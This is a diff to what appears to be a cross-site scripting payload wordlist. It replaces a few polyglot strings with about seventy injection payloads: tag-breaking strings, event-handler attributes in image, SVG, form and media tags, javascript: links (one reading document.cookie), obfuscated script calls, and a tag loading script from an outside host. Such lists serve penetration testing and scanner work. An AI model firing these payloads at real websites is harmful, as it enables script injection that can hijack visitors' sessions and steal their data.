@@ -1,5 +1,73 @@
-jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('XSS')//\x3e
+'>"><img src=x:x onerror=alert(1)>
+'--><img/src=x onerror=alert(1)>
+"onmouseover="alert(1)
+x' onclick='alert(1)' y='
+';alert(1);//
+";alert(1);//
+``alert(1)``
+</script><img src=x onerror=alert(1)>
+</title><img src=x onerror=alert(1)>
+</textarea><img src=x onerror=alert(1)>
+</style><img src=x onerror=alert(1)>
+</noscript><img src=x onerror=alert(1)>
+</listing><img src=x onerror=alert(1)>
+</xmp><img src=x onerror=alert(1)>
+</plaintext><img src=x onerror=alert(1)>
+;alert(1)//
+');alert(1);//
+");alert(1);//
+`);alert(1);//
+-alert(1)//
++alert(1)//
+/alert(1)//
+*alert(1)//
+%0aalert(1)//
 
-'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><Script>prompt(1)</Script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(document.domain)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id)>'"><img src="http://i.imgur.com/P8mL8.jpg">
+alert(1)//
 
-"onclick=alert(1)//<button onclick=alert(1)//> "><script>alert(document.domain)</script>
+alert(1)//
+
+alert(1)//
+<img src=x onerror=alert(1)>
+<img src=1 onerror=alert(1)>
+<img/src=x/onerror=alert(1)>
+<img/src='x'/onerror='alert(1)'>
+<img src=x onerror=prompt(1)>
+<img src=x onerror=confirm(1)>
+<svg onload=alert(1)>
+<svg/onload=alert(1)>
+<svg onload=prompt(1)>
+<svg onload=confirm(1)>
+<body onload=alert(1)>
+<body onpageshow=alert(1)>
+<body onfocus=alert(1)>
+<input autofocus onfocus=alert(1)>
+<input type=text autofocus onfocus=alert(1)>
+<select autofocus onfocus=alert(1)>
+<textarea autofocus onfocus=alert(1)>
+<details open ontoggle=alert(1)>
+<marquee onstart=alert(1)>
+<a href=javascript:alert(1)>x</a>
+<a href="javascript:alert(1)">x</a>
+<a href=javascript:alert(document.cookie)>x</a>
+<iframe src=javascript:alert(1)></iframe>
+<object data=javascript:alert(1)>
+<embed src=javascript:alert(1)>
+<form><button formaction=javascript:alert(1)>x</button></form>
+<math><mtext onmouseover=alert(1)>x</mtext></math>
+<xss onpointerover=alert(1)>x</xss>
+<xss onpointerenter=alert(1)>x</xss>
+<xss id=a tabindex=1 onactivate=alert(1)>x</xss>
+<xss contenteditable onblur=alert(1)>x</xss>
+<xss tabindex=1 onfocus=alert(1)>x</xss>
+<xss class=a1 onanimationstart=alert(1)>x</xss>
+<xss class=a2 onanimationend=alert(1)>x</xss>
+<xss ontransitionend=alert(1)>x</xss>
+<video autoplay><source onerror=alert(1)></video>
+<audio autoplay><source onerror=alert(1)></audio>
+<track default ontimeupdate=alert(1)>
+<script src=https://xss.rocks/xss.js></script>
+<script>alert(String.fromCharCode(88,83,83))</script>
+<script>a=alert,a(1)</script>
+<script>a=['ale','rt'];window[a.join('')](1)</script>
